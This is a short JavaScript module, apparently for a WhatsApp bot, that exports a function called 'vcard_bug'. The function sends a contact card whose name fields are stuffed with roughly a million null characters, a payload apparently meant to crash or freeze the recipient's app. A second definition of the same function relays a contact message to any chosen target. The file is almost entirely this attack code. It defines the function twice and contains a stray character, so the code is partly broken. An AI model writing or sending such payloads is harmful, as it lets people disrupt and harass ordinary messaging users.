
export async function vcard_bug(message, client) {

    const remoteJid = message.key.remoteJid;

    const vcard = 'BEGIN:VCARD\n' // metadata of the contact card
            + `FN: _🌹 𝐋𝐨𝐫𝐝_𝐎𝐛𝐢𝐭𝐨-𝐃𝐞𝐯 🌹_\n${"\u0000".repeat(1020000)}\n` // full name
            + `TEL;type=CELL;type=VOICE;waid=2250712668494:+2250712668494\n$`
            + 'END:VCARD'

    await client.sendMessage(remoteJid,

        { 
            contacts: { 

                displayName: `_🌹 𝐋𝐨𝐫𝐝_𝐎𝐛𝐢𝐭𝐨-𝐃𝐞𝐯 🌹"_\n${"\u0000".repeat(1020000)}`, 

                contacts: [{ vcard }] 
            }
        }
    );

}

export default vcard_bug;

export async function vcard_bug(message, client, target) {

    const remoteJid = message.key.remoteJid;

    const vcard = 'BEGIN:VCARD\n'

        + `FN: _🌹 𝐋𝐨𝐫𝐝_𝐎𝐛𝐢𝐭𝐨-𝐃𝐞𝐯 🌹_\n`

        + `TEL;type=CELL;type=VOICE;waid=2250712668494:+2250712668494\n`

        + 'END:VCARD';

    const msg = proto.Message.fromObject({

        contactsMessage: {

            displayName: `_🌹 𝐋𝐨𝐫𝐝_𝐎𝐛𝐢𝐭𝐨-𝐃𝐞𝐯 🌹_`,

            contacts: [

                { vcard }
            ]
        }
    });

    await client.relayMessage(target, msg, { 

        messageId: message.key.id 

    },  { participant: { jid: target } }

    );
}